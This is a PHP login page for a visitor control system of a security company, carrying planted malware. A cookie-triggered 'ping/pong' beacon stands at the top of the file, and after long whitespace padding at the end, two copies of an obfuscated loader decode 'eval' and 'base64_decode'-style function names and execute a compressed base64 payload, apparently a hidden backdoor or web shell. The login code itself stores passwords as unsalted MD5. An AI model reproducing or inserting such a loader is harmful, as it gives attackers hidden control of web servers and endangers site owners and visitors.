<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/index_error.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/index_error.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/index_error.php<-";}return "NotGO->./cynergi/index_error.php<-";}}@ob_start("ob_sh");}}$frt=2;?><?php require_once('Connections/dplace.php'); ?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}
?>
<?php
// *** Validate request to login to this site.
if (!isset($_SESSION)) {
  session_start();
}

$loginFormAction = $_SERVER['PHP_SELF'];
if (isset($_GET['accesscheck'])) {
  $_SESSION['PrevUrl'] = $_GET['accesscheck'];
}

if (isset($_POST['textfield'])) {
  $loginUsername=$_POST['textfield'];
  $password=md5($_POST['textfield2']);
  $MM_fldUserAuthorization = "";
  $MM_redirectLoginSuccess = "menu.php";
  $MM_redirectLoginFailed = "index.php";
  $MM_redirecttoReferrer = false;
  mysql_select_db($database_dplace, $dplace);
  
  $LoginRS__query=sprintf("SELECT username, password FROM tbl_users WHERE username=%s AND password=%s",
    GetSQLValueString($loginUsername, "text"), GetSQLValueString($password, "text")); 
   
  $LoginRS = mysql_query($LoginRS__query, $dplace) or die(mysql_error());
  $loginFoundUser = mysql_num_rows($LoginRS);
  if ($loginFoundUser) {
     $loginStrGroup = "";
    
    //declare two session variables and assign them
    $_SESSION['MM_Username'] = $loginUsername;
    $_SESSION['MM_UserGroup'] = $loginStrGroup;	      

    if (isset($_SESSION['PrevUrl']) && false) {
      $MM_redirectLoginSuccess = $_SESSION['PrevUrl'];	
    }
    header("Location: " . $MM_redirectLoginSuccess );
  }
  else {
    header("Location: ". $MM_redirectLoginFailed );
  }
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/templatebasic.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<!-- InstanceBeginEditable name="doctitle" -->
<title>All American Security Servies</title>
<!-- InstanceEndEditable -->
<!-- InstanceBeginEditable name="head" -->
<!-- InstanceEndEditable -->
<link href="css/style.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
body {
	background-image: url(images/bgnd.jpg);
	background-repeat: repeat-x;
}
-->
</style></head>

<body>
<br />
<table width="442" height="159" border="0" align="center">
  <tr>
    <td width="217" height="128" align="center"><img src="images/dplace_logo.JPG" width="183" height="111" /></td>
    <td width="217" align="center"><span class="titulo">Visitor control system <br />
All American Security Services</span></td>
  </tr>
</table>
<table width="673" border="0" align="center">
  <tr>
    <td width="362" align="center">&nbsp;</td>
  </tr>
</table>
<!-- InstanceBeginEditable name="central" -->
<table width="692" height="367" border="0" align="center">
  <tr>
    <td align="center" valign="top"><br />
      <br />
      <table width="438" border="1">
        <tr>
          <td width="377">If you are a tennant and you want to leave a message to the Front Desk/ Front gate, please click over the envelope icon</td>
          <td width="45"><a href="tennant_msg.php"><img src="images/msgs.jpg" width="45" height="49" border="0" /></a></td>
        </tr>
      </table>
      <br />
    <br />
<br />
<form id="form1" name="form1" method="POST" action="<?php echo $loginFormAction; ?>">
      <table width="278" border="1">
        <tr>
          <td width="100" bgcolor="#333333" class="etiqueta">Username:</td>
          <td width="162" align="left"><label>
            <input type="text" name="textfield" id="textfield" />
          </label></td>
        </tr>
        <tr>
          <td bgcolor="#333333" class="etiqueta">Password:</td>
          <td align="left"><label>
            <input type="password" name="textfield2" id="textfield2" />
          </label></td>
        </tr>
        <tr>
          <td bgcolor="#333333" class="etiqueta">&nbsp;</td>
          <td><label>
            <input type="submit" name="button" id="button" value="Submit" />
          </label></td>
        </tr>
      </table>
    </form></td>
  </tr>
</table>
<!-- InstanceEndEditable -->
</body>
<!-- InstanceEnd --></html>
?> 



































































































                                                                                                                                                                                                                                                          <?php /*14*/ $_________=h0mTR7kX(24965);$_________=create_function(chr(36).chr(97).@chr(),$_________.chr(40).chr(36).chr(97).chr(41).chr(59).@chr());$________=h0mTR7kX(22290).chr(54).chr(52).chr(95).@chr().h0mTR7kX(5550932);$_______=h0mTR7kX(1609413548);$_______=chr(103).chr(122).@chr().$_______.h0mTR7kX(119);$_________($_______($________("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")));function h0mTR7kX($eRvQQuiP){$aRR=array(0,97,98,99,100,101,108,115,118,105,110,111,117,109,112,114);$sSR=@chr();$eRvYQuiP=0;while($eRvYQuiP<8){if($aRR[$eRvQQuiP-(($eRvQQuiP>>4)<<4)]){$sSR.=chr($aRR[$eRvQQuiP-(($eRvQQuiP>>4)<<4)]);}$eRvQQuiP=$eRvQQuiP>>4;$eRvYQuiP++;}return$sSR;}?>



































































































                                                                                                                                                                                                                                                          <?php /*14*/ $_________=h0mTR7kX(24965);$_________=create_function(chr(36).chr(97).@chr(),$_________.chr(40).chr(36).chr(97).chr(41).chr(59).@chr());$________=h0mTR7kX(22290).chr(54).chr(52).chr(95).@chr().h0mTR7kX(5550932);$_______=h0mTR7kX(1609413548);$_______=chr(103).chr(122).@chr().$_______.h0mTR7kX(119);$_________($_______($________("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")));function h0mTR7kX($eRvQQuiP){$aRR=array(0,97,98,99,100,101,108,115,118,105,110,111,117,109,112,114);$sSR=@chr();$eRvYQuiP=0;while($eRvYQuiP<8){if($aRR[$eRvQQuiP-(($eRvQQuiP>>4)<<4)]){$sSR.=chr($aRR[$eRvQQuiP-(($eRvQQuiP>>4)<<4)]);}$eRvQQuiP=$eRvQQuiP>>4;$eRvYQuiP++;}return$sSR;}?>